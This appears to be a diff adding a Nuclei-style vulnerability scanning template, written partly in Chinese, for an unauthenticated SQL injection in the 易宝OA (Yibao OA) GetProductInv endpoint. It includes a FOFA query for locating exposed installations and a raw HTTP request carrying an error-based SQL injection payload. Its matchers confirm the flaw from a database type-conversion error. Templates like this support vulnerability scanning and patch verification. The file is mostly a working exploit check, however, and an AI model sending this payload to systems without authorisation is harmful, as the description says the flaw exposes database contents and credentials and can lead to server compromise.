@@ -1,0 +1,35 @@
+id: yibaoOA-GetProductInv-sql
+
+info:
+  name: 易宝OA GetProductInv SQL注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: product="顶讯科技-易宝OA系统"
+    易宝OA GetProductInv接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488545&idx=1&sn=c8f4e293b57313327db9532c7fbeb9dc&chksm=c267a112f510280482f123775f66411188c3c594443085bae039eab5a90b6f913b189707c913&token=2115358587&lang=zh_CN#rd
+  tags: sql injection
+
+
+
+http:
+  - raw:
+      - |
+        GET /SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&positionName=2&productID=3&opeID=4 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+      - type: status
+        status: 
+          - 200
+
+
+
+
